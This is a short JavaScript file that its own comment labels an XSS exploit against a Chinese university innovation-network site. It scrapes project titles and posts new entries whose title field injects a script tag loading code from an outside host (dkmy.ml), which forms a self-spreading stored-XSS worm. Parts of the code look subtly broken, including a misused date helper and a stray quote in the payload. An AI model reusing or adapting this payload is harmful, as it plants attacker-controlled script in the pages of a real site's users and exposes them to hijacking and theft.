'use strict';

/**
 * 功能：  创新网某处的XSS漏洞利用
 */

var re = /<strong><a.*?>(.*?)<\/a><\/strong>/g;

function pad2(n) {
    return n < 10 ? '0' + n : n;
}

function formatDate(datetime_str) {
    const d = new Date(datetime_str);
    return d.getFullYear().toString() +
        '-' + this.ctx.helper.pad2(d.getMonth() + 1) +
        '-' + this.ctx.helper.pad2(d.getDate());
}

function exploit() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/iv/srtpHire_list.do?type=1', true);
    xhr.onreadystatechange = function () {
        if(xhr.readyState === 4 && xhr.status === 200) {
            var html = xhr.responseText;
            var item = new Set();
            while (r = re.exec(html)) {
                item.add(r[1]);
            }
            item = Array.from(item);
            var title = item[Math.floor(item.length*Math.random())];
            commit_proj(title);
        }
    };
    xhr.send(null);
}

function commit_proj(title) {
    var xhr = new XMLHttpRequest();
    var start_date = new Date();
    var end_date = new Date((new Date()).setMinutes(start_date.getDate() + 33));
    start_date = formatDate(start_date);
    end_date = formatDate(end_date);
    xhr.open("POST", '/iv/group_add.do', true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    data = "beginDate=" + start_date;
    data += "&btn1=发布信息";
    data += "&contactNumber=" + Math.floor(Math.random() * 1000000000);
    data += "&detail=西南jio痛大学简直强无敌！"
    data += "&endDate=" + end_date;
    data += "&group.acceptCollegeCode=0&group.contactWay=0&group.sortId=1"
    data += "&theme=" + title;
    data += "&title=" + title + "%3Cscript+src%3D'https%3A%2F%2Fdkmy.ml%2Fswjtu%2Fcxw''%3E%3C%2Fscript%3E"
    xhr.send(data);
}